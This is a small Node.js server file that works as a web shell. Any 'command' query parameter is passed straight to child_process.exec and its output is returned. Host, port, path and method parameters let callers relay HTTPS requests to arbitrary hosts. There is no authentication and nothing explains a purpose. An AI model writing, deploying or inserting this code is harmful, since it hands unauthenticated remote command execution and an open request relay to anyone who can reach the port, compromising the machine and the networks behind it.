var http = require('http'); // 1 - Import Node.js core module
const { exec } = require("child_process");
const url = require('url');

const https = require('https')
const options = {
  hostname: 'whatever.com',
  port: 443,
  path: '/todos',
  method: 'GET'
}

http.createServer(function (req, res) {
  const queryObject = url.parse(req.url,true).query;
  console.log(queryObject);
  var response = ':(';

  var command = queryObject['command'];
  var host = queryObject['host'];
  var port = queryObject['port'];
  var method = queryObject['method'];
  var path = queryObject['path'];
        if(command){
            exec(command, (error, stdout, stderr) => {
                if (error) {
                    console.log(`error: ${error.message}`);
                    response = error.message;
                }
                else if (stderr) {
                    console.log(`stderr: ${stderr}`);
                    response=stderr;
                }
                else
                    response = stdout;
                res.writeHead(200, {'Content-Type': 'text/html'});
                res.end(response.toString());              
                console.log(response);
            });
        }
        else if(host && method){
            var options = {
                hostname: host,
                port: port,
                path: path,
                method: method
              }
            const req = https.request(options, response => {
            console.log(`statusCode: ${response.statusCode}`)
            
            response.on('data', d => {
                process.stdout.write(d)
                res.writeHead(200, {'Content-Type': 'text/html'});
                res.end(d);              
            })
            })
            
            req.on('error', error => {
                console.error(error)
            })
            
            req.end()
        }
        else{
            res.writeHead(200, {'Content-Type': 'text/html'});
            res.end(response);
        }
}).listen(8080);
